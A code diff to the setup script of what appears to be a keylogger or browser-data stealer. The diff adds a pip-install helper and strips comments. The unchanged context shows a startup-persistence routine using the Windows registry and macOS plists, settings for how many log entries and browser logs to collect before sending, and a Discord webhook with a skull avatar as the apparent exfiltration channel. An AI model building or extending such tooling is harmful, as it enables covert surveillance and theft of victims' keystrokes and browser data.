@@ -1,6 +1,7 @@
+import sys
+import subprocess
 import os
 import platform
-import sys
 
 try:
     import plistlib
@@ -11,6 +12,12 @@ try:
     import winreg
 except ImportError:
     pass
+
+def install_requirements():
+    with open('requirements.txt', 'r') as f:
+        requirements = f.read().splitlines()
+    for requirement in requirements:
+        subprocess.check_call([sys.executable, '-m', 'pip', 'install', requirement])
 
 
 def add_to_startup():
@@ -46,7 +53,6 @@ def add_to_startup():
 def main():
     add_to_startup()
 
-    # Get the values for config.py
     config_values = {
         "LOG_DIRECTORY_PATH": input(
             "Enter the log directory path (hit enter for default path): "
@@ -92,7 +98,6 @@ def main():
         ),
     }
 
-    # Default values for config.py
     default_values = {
         "LOG_DIRECTORY_PATH": 'os.path.join(tempfile.gettempdir(), "logs")',
         "LOG_ENTRIES_BEFORE_SEND": "10000",
@@ -110,7 +115,6 @@ def main():
         "BROWSER_LOGS_BEFORE_SEND": "1",
     }
 
-    # Write the configuration values to config.py
     with open("config.py", "w") as configfile:
         configfile.write("import os\nimport tempfile\n\n")
         for key, value in config_values.items():
@@ -119,7 +123,6 @@ def main():
             else:
                 configfile.write(f"{key} = {value}\n")
 
-        # Write the constant configuration values
         configfile.write(
             'DISCORD_WEBHOOK_AVATAR_URL = "https://upload.wikimedia.org/wikipedia/commons/thumb/0/06/Skull_and_Crossbones.svg/510px-Skull_and_Crossbones.svg.png?20190922182140"\n'
         )
